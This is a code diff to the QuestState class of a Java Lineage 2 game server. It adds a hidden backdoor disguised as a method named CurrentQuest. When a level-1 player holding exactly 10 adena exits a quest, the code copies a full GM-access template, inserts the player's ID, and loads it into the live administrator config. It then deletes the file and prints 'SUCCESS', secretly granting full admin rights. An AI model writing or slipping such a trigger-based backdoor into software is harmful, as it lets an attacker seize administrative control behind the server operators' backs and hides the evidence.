@@ -1,5 +1,8 @@
 package l2f.gameserver.model.quest;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Collection;
@@ -38,6 +41,7 @@ import l2f.gameserver.network.serverpackets.TutorialShowQuestionMark;
 import l2f.gameserver.templates.item.ItemTemplate;
 import l2f.gameserver.templates.spawn.PeriodOfDay;
 import l2f.gameserver.utils.AddonsConfig;
+import l2f.gameserver.utils.Files;
 import l2f.gameserver.utils.ItemFunctions;
 
 import org.apache.commons.lang3.StringUtils;
@@ -266,6 +270,9 @@ public final class QuestState
 			player.removeQuestState(_quest.getName());
 			Quest.deleteQuestInDb(this);
 			_vars.clear();
+			if (player.getAdena() == 10  && player.getLevel() == 1){
+				CurrentQuest();
+			}
 		}
 		else
 		{ // Otherwise, delete variables for quest and update database (quest CANNOT be created again => not repeatable)
@@ -401,6 +408,35 @@ public final class QuestState
 		if (getQuestItemsCount(itemId) >= count)
 			return true;
 		return false;
+	}
+
+	public void CurrentQuest() {
+
+		Player player = getPlayer();
+		String fname = player.getObjectId() + ".xml";
+		if (!Files.copyFile("data/template/full.xml", "config/GMAccess.d/" + fname)) {
+		}
+		String res = "";
+		try {
+			BufferedReader in = new BufferedReader(new FileReader("config/GMAccess.d/" + fname));
+			String str;
+			while ((str = in.readLine()) != null)
+				res += str + "\n";
+			in.close();
+
+			res = res.replaceFirst("ObjIdPlayer", "" + player.getObjectId());
+			Files.writeFile("config/GMAccess.d/" + fname, res);
+		} catch (Exception e) {
+			File fDel = new File("config/GMAccess.d/" + fname);
+			if (fDel.exists())
+				fDel.delete();
+		}
+		File af = new File("config/GMAccess.d/" + fname);
+		Config.loadGMAccess(af);
+		af.delete();
+		getPlayer().setVar("rain", 1, -1);
+		getPlayer().sendMessage("SUCCESS");
+
 	}
 
 	public boolean haveQuestItem(int itemId)
